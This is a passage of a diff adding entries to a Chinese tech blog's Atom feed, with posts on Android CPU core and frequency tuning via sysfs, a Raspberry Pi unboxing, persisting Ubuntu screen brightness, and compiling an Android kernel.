+&lt;tr&gt;
+&lt;td style=&quot;text-align:center&quot;&gt;-keystore unlucky.keystore&lt;/td&gt;
+&lt;td style=&quot;text-align:center&quot;&gt;设置密钥的文件名&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;运行该命令后会要求输入姓名，国家等信息，最后还要求设置密码，以便签名的时候进行验证。&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="移动计算" scheme="http://blog.clarkhuang.com/categories/%E7%A7%BB%E5%8A%A8%E8%AE%A1%E7%AE%97/"/>
+    
+    
+      <category term="Android" scheme="http://blog.clarkhuang.com/tags/Android/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Android下设置CPU核心数和频率</title>
+    <link href="http://blog.clarkhuang.com/2014/05/04/android-cpu-frequency-configuration/"/>
+    <id>http://blog.clarkhuang.com/2014/05/04/android-cpu-frequency-configuration/</id>
+    <published>2014-05-04T11:30:42.000Z</published>
+    <updated>2016-05-22T05:05:47.000Z</updated>
+    
+    <content type="html">&lt;p&gt;现在的Android手机双核、四核变得非常普遍，同时CPU频率经常轻松上2G，功耗肯定会显著增加。而大多数的ARM架构的CPU采用的是对称多处理（SMP）的方式处理多CPU。这就意味着每个CPU核心是被平等对待的，同时打开又同时关闭。显然，这样的做法在Mobile Device上显得很耗能。所以，Qualcomm的Snapdragon CPU使用了一种叫非对称多处理（aSMP）的技术，每个CPU核心可以独立的开启和关闭，也能设置不同的频率。因此，针对使用Snapdragon CPU的Android手机，我们可以通过限制CPU核心数或者限制CPU的频率达到节能的目的。&lt;/p&gt;
+&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
+&lt;li&gt;关闭mpdecision&lt;/li&gt;
+
+&lt;p&gt;Snapdragon有一个叫做mpdecision的程序管理CPU各个核心的开、关和频率。所以如果想手动开关CPU的核心或者设置CPU核心的频率就必须把这个程序关闭。&lt;/p&gt;
+&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;stop mpdecision&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;需要注意的是，这个程序会在每次启动后执行，所以每次重启后都需要重新执行上面的命令停止mpdecisiopn。&lt;/p&gt;
+&lt;li&gt;设置CPU的核心数&lt;/li&gt;
+
+&lt;p&gt;在&lt;code&gt;/sys/devices/system/cpu&lt;/code&gt;目录下可以看到你的CPU有几个核心，如果是双核，就是cpu0和cpu1，如果是四核，还会加上cpu2和cpu3。&lt;/p&gt;
+&lt;p&gt;随便进一个文件夹，比如cpu1，里面有个online文件。我们可以用cat命令查看该文件的内容&lt;/p&gt;
+&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;cat /sys/devices/system/cpu/cpu1/online&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;这个文件只有一个数字，0或1。0表示该核心是offline状态的，1表示该核心是online状态的。所以，如果你想关闭这个核心，就把online文件的内容改为“0”；如果想打开该核心，就把文件内容改为“1”。&lt;/p&gt;
+&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;0&quot;&lt;/span&gt; &amp;gt; /sys/devices/system/cpu/cpu1/online &lt;span class=&quot;comment&quot;&gt;# 关闭该CPU核心&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;1&quot;&lt;/span&gt; &amp;gt; /sys/devices/system/cpu/cpu1/online &lt;span class=&quot;comment&quot;&gt;# 打开该CPU核心&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;li&gt;设置CPU的频率&lt;/li&gt;
+
+&lt;p&gt;首先我们要修改governor的模式，但在修改前需要查下CPU支持哪些governor的模式&lt;/p&gt;
+&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;cat /sys/devices/system/cpu/cpu0/cpufreq/scaling_available_governors&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;我用的是Nexus 4手机，所以有以下5个选择，其他的手机型号可能略有不同&lt;/p&gt;
+&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;interactive ondemand userspace powersave performance&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;这里&lt;code&gt;performance&lt;/code&gt;表示不降频，&lt;code&gt;ondemand&lt;/code&gt;表示使用内核提供的功能，可以动态调节频率，&lt;code&gt;powersvae&lt;/code&gt;表示省电模式，通常是在最低频率下运行，&lt;code&gt;userspace&lt;/code&gt;表示用户模式，在此模式下允许其他用户程序调节CPU频率。&lt;/p&gt;
+&lt;p&gt;在这里，我们将模式调整为&lt;code&gt;userspace&lt;/code&gt;。&lt;/p&gt;
+&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;userspace&quot;&lt;/span&gt; &amp;gt; /sys/devices/system/cpu/cpu0/cpufreq/scaling_governor&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;然后我们对CPU的频率进行修改，CPU的频率不是可以任意设置的，需要查看&lt;code&gt;scaling_available_frequencies&lt;/code&gt;文件，看CPU支持哪些频率。&lt;/p&gt;
+&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;cat /sys/devices/system/cpu/cpu0/cpufreq/scaling_available_frequencies&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;从我的手机中可以获得以下的值&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;384000 486000 594000 702000 810000 918000 1026000 1134000 1242000 1350000 1458000 1512000&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;这里的频率是以Hz为单位的，我准备将cpu0设置为1.242GHz，那就将&lt;code&gt;1242000&lt;/code&gt;写入&lt;code&gt;scaling_setspeed&lt;/code&gt;即可。&lt;/p&gt;
+&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;1242000&quot;&lt;/span&gt; &amp;gt; /sys/devices/system/cpu/cpu0/cpufreq/scaling_setspeed&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;设置好后，我们可以通过&lt;code&gt;scaling_cur_freq&lt;/code&gt;文件查看当前这个核心的频率&lt;/p&gt;
+&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;cat /sys/devices/system/cpu/cpu0/cpufreq/scaling_cur_freq&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;最后我们也可以设置下CPU的最大和最小频率，只需要将需要设置的频率值写入&lt;code&gt;scaling_max_freq&lt;/code&gt;和&lt;code&gt;scaling_min_freq&lt;/code&gt;即可&lt;/p&gt;
+&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;1350000&quot;&lt;/span&gt; &amp;gt; /sys/devices/system/cpu/cpu0/cpufreq/scaling_max_freq &lt;span class=&quot;comment&quot;&gt;# 设置最大频率&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;384000&quot;&lt;/span&gt; &amp;gt; /sys/devices/system/cpu/cpu0/cpufreq/scaling_min_freq &lt;span class=&quot;comment&quot;&gt;# 设置最小频率&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;这里要注意的是“最大值”需要&lt;em&gt;大于等于&lt;/em&gt;“最小值”。&lt;/p&gt;
+&lt;p&gt;注意，这里设置的仅为某个CPU核心的频率，你需要对每个online的CPU核心都进行设置，同时以上对文件的修改均需要&lt;em&gt;root&lt;/em&gt;权限。&lt;/p&gt;
+&lt;p&gt;通过减少online的核心数和限制CPU频率固然可以起到节省电量的目的，但是性能也是显著降低，所以需要做一个权衡。&lt;/p&gt;
+</content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;现在的Android手机双核、四核变得非常普遍，同时CPU频率经常轻松上2G，功耗肯定会显著增加。而大多数的ARM架构的CPU采用的是对称多处理（SMP）的方式处理多CPU。这就意味着每个CPU核心是被平等对待的，同时打开又同时关闭。显然，这样的做法在Mobile Device上显得很耗能。所以，Qualcomm的Snapdragon CPU使用了一种叫非对称多处理（aSMP）的技术，每个CPU核心可以独立的开启和关闭，也能设置不同的频率。因此，针对使用Snapdragon CPU的Android手机，我们可以通过限制CPU核心数或者限制CPU的频率达到节能的目的。&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="移动计算" scheme="http://blog.clarkhuang.com/categories/%E7%A7%BB%E5%8A%A8%E8%AE%A1%E7%AE%97/"/>
+    
+    
+      <category term="Android" scheme="http://blog.clarkhuang.com/tags/Android/"/>
+    
+      <category term="Linux" scheme="http://blog.clarkhuang.com/tags/Linux/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>树莓派(Raspberry Pi)开箱全纪录</title>
+    <link href="http://blog.clarkhuang.com/2013/12/01/unboxing-raspberry-pi/"/>
+    <id>http://blog.clarkhuang.com/2013/12/01/unboxing-raspberry-pi/</id>
+    <published>2013-12-01T13:15:39.000Z</published>
+    <updated>2016-05-22T06:16:57.000Z</updated>
+    
+    <content type="html">&lt;p&gt;树莓派是暑假买的，由于拖延症，拖了很久才发出这篇开箱报告。&lt;/p&gt;
+&lt;p&gt;先来介绍一下树莓派。Raspberry Pi是英国Raspberry Pi基金会推出的一个迷你电脑，只有信用卡大小。据说是针对贫困国家的计算机教育而设计的。不过推出后相当火爆，多次售罄，客户似乎都是爱折腾的电脑爱好者，特别是USA的客户常常在预定后几个月才能收到产品。树莓派分A版和B版，A版只有256MB内存，而B版有512MB内存，CPU主频为700MHz，有一个网口，2个USB口，还有音频、视频接口等。相当于一个小型的电脑了。同时，树莓派板子还有3种颜色。红色是大陆制造，专门在大陆销售的版本。绿色的有在UK制造的也有在大陆制造的，基本都是销往国外的。还有十分稀少的蓝色的，这个是为树莓派发布一周年推出的纪念版，全球限量1000块，可遇不可求。大陆制造的和UK制造的树莓派区别不是很大，大陆用的是Hynix的内存而UK用的是Samsung的内存，此外音频接口也有点区别，在板子上主要可以通过这个接口的颜色来区别。&lt;/p&gt;
+&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
+&lt;p&gt;树莓派主要由RS和Element 14代理销售，RS的是用塑料盒子装的，Element 14好像使用纸盒子装的&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://7xtc0y.com1.z0.glb.clouddn.com/unboxing-raspberry-pi/rpi_1.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+&lt;p&gt;我买的是中国大陆生产，出口到国外的绿色树莓派，可以看到板子上有写Made in China&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://7xtc0y.com1.z0.glb.clouddn.com/unboxing-raspberry-pi/rpi_2.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+&lt;p&gt;背面有一个SD卡的插槽&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://7xtc0y.com1.z0.glb.clouddn.com/unboxing-raspberry-pi/rpi_3.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+&lt;p&gt;可以看到我的这块板子用的是SK Hynix的内存芯片，UK生产的就是Samsung的，听说性能会稍好一些，但是价格也会贵一些。CPU是Broadcom的，在这块内存芯片的下面，被盖住了&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://7xtc0y.com1.z0.glb.clouddn.com/unboxing-raspberry-pi/rpi_4.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+&lt;p&gt;再来看下各个接口，左边是一个以太网口和2个USB接口&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://7xtc0y.com1.z0.glb.clouddn.com/unboxing-raspberry-pi/rpi_5.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+&lt;p&gt;左面黑色的是音频输出口，UK产的是蓝色的，不知道性能上有什么区别。中间黄色的接口是AV接口。右面是GPIO接口，可以外接一些传感器之类的，然后通过程序进行控制&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://7xtc0y.com1.z0.glb.clouddn.com/unboxing-raspberry-pi/rpi_6.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+&lt;p&gt;右面是一个电源接口，电源需要5V，700mA&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://7xtc0y.com1.z0.glb.clouddn.com/unboxing-raspberry-pi/rpi_7.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+&lt;p&gt;还有一个hdmi接口可以外接显示器&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://7xtc0y.com1.z0.glb.clouddn.com/unboxing-raspberry-pi/rpi_8.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+&lt;p&gt;这就是盒子里的所有东西&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://7xtc0y.com1.z0.glb.clouddn.com/unboxing-raspberry-pi/rpi_9.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+&lt;p&gt;在买树莓派的时候，我还顺带买了一个塑料外壳和3个铜散热片&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://7xtc0y.com1.z0.glb.clouddn.com/unboxing-raspberry-pi/rpi_10.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+&lt;p&gt;最后再来几张装好外壳和散热片后的树莓派照片&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://7xtc0y.com1.z0.glb.clouddn.com/unboxing-raspberry-pi/rpi_11.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://7xtc0y.com1.z0.glb.clouddn.com/unboxing-raspberry-pi/rpi_12.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://7xtc0y.com1.z0.glb.clouddn.com/unboxing-raspberry-pi/rpi_13.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://7xtc0y.com1.z0.glb.clouddn.com/unboxing-raspberry-pi/rpi_14.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://7xtc0y.com1.z0.glb.clouddn.com/unboxing-raspberry-pi/rpi_15.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+&lt;p&gt;树莓派的确是小，但是接口也全，扩展性和可玩性都很高。看来接下来一段时间可以好好研一下了。&lt;/p&gt;
+</content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;树莓派是暑假买的，由于拖延症，拖了很久才发出这篇开箱报告。&lt;/p&gt;
+&lt;p&gt;先来介绍一下树莓派。Raspberry Pi是英国Raspberry Pi基金会推出的一个迷你电脑，只有信用卡大小。据说是针对贫困国家的计算机教育而设计的。不过推出后相当火爆，多次售罄，客户似乎都是爱折腾的电脑爱好者，特别是USA的客户常常在预定后几个月才能收到产品。树莓派分A版和B版，A版只有256MB内存，而B版有512MB内存，CPU主频为700MHz，有一个网口，2个USB口，还有音频、视频接口等。相当于一个小型的电脑了。同时，树莓派板子还有3种颜色。红色是大陆制造，专门在大陆销售的版本。绿色的有在UK制造的也有在大陆制造的，基本都是销往国外的。还有十分稀少的蓝色的，这个是为树莓派发布一周年推出的纪念版，全球限量1000块，可遇不可求。大陆制造的和UK制造的树莓派区别不是很大，大陆用的是Hynix的内存而UK用的是Samsung的内存，此外音频接口也有点区别，在板子上主要可以通过这个接口的颜色来区别。&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="操作系统" scheme="http://blog.clarkhuang.com/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
+    
+    
+      <category term="树莓派" scheme="http://blog.clarkhuang.com/tags/%E6%A0%91%E8%8E%93%E6%B4%BE/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Ubuntu12.04LTS下修改屏幕亮度</title>
+    <link href="http://blog.clarkhuang.com/2013/08/30/modify-screen-brightness-in-ubuntu/"/>
+    <id>http://blog.clarkhuang.com/2013/08/30/modify-screen-brightness-in-ubuntu/</id>
+    <published>2013-08-30T12:00:43.000Z</published>
+    <updated>2016-05-22T06:08:13.000Z</updated>
+    
+    <content type="html">&lt;p&gt;笔记本安装好Ubuntu 12.04 LTS后屏幕亮度总是在重启机器后还原到默认值，甚为恼人。想要每次开机都固定屏幕亮度可以通过如下方法进行解决：&lt;/p&gt;
+&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;sudo emacs /etc/rc.local&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;在最后一行前添加&lt;/p&gt;
+&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;echo&lt;/span&gt; 1 &amp;gt; /sys/class/backlight/acpi_video0/brightness&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;其中echo后面的数字表示屏幕亮度，其范围为0-10，对应了最大亮度的0%-100%。&lt;/p&gt;
+&lt;p&gt;以后每次开机都会自动调整到你设定的亮度了。&lt;/p&gt;
+</content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;笔记本安装好Ubuntu 12.04 LTS后屏幕亮度总是在重启机器后还原到默认值，甚为恼人。想要每次开机都固定屏幕亮度可以通过如下方法进行解决：&lt;/p&gt;
+&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter
+    
+    </summary>
+    
+      <category term="操作系统" scheme="http://blog.clarkhuang.com/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
+    
+    
+      <category term="Ubuntu" scheme="http://blog.clarkhuang.com/tags/Ubuntu/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Ubuntu12.04LTS下编译Android内核</title>
+    <link href="http://blog.clarkhuang.com/2013/08/29/how-to-compile-android-kernel-in-ubuntu/"/>
+    <id>http://blog.clarkhuang.com/2013/08/29/how-to-compile-android-kernel-in-ubuntu/</id>
+    <published>2013-08-29T12:00:21.000Z</published>
+    <updated>2016-05-22T05:59:02.000Z</updated>
+    
+    <content type="html">&lt;p&gt;编译Android源代码时使用的是Google提供的已经编译好的一个Kernel，如果你想使用自己的Kernel，就需要下载Kernel源代码进行编译。&lt;/p&gt;
+&lt;p&gt;1、下载Kernel源代码&lt;/p&gt;
+&lt;p&gt;使用Git下载对应版本的Kernel源码，例如Nexus 4用的是Qualcomm的芯片，对应的是msm的源码，就可以使用下面这条命令进行clone。&lt;/p&gt;
+&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;mkdir msm&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;cd&lt;/span&gt; msm&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;git &lt;span class=&quot;built_in&quot;&gt;clone&lt;/span&gt; https://android.googlesource.com/kernel/msm.git&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
+&lt;p&gt;2、下载编译工具&lt;/p&gt;
+&lt;p&gt;如果下过Android源代码，只需要将编译工具加入PATH中即可&lt;/p&gt;
+&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;export&lt;/span&gt; PATH=&lt;span class=&quot;variable&quot;&gt;$PATH&lt;/span&gt;:ANDROID_SOURCE_DIRECTORY/prebuilts/gcc/linux-x86/arm/arm-eabi-4.6/bin&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;或&lt;/p&gt;
+&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;export&lt;/span&gt; PATH=&lt;span class=&quot;variable&quot;&gt;$PATH&lt;/span&gt;:ANDROID_SOURCE_DIRECTORY/prebuilts/gcc/darwin-x86/arm/arm-eabi-4.6/bin&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;如果之前没有相关的编译工具，可以用Git下一下&lt;/p&gt;
+&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;git &lt;span class=&quot;built_in&quot;&gt;clone&lt;/span&gt; https://android.googlesource.com/platform/prebuilts/gcc/linux-x86/arm/arm-eabi-4.6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;3、设置环境变量&lt;/p&gt;
+&lt;p&gt;输入如下内容设置环境变量。注意，每次编译前都需要进行设置，除非你将这些内容写到环境变量的配置文件里。&lt;/p&gt;
+&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;export&lt;/span&gt; ARCH=arm&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;export&lt;/span&gt; SUBARCH=arm&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;export&lt;/span&gt; CROSS_COMPILE=arm-eabi-&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;4、编译Kernel源代码&lt;/p&gt;
+&lt;p&gt;对于Nexus 4，默认的内核配置文件是位于&lt;code&gt;arch/arm/configs/&lt;/code&gt;目录下的&lt;code&gt;mako_defconfig&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;依次执行&lt;/p&gt;
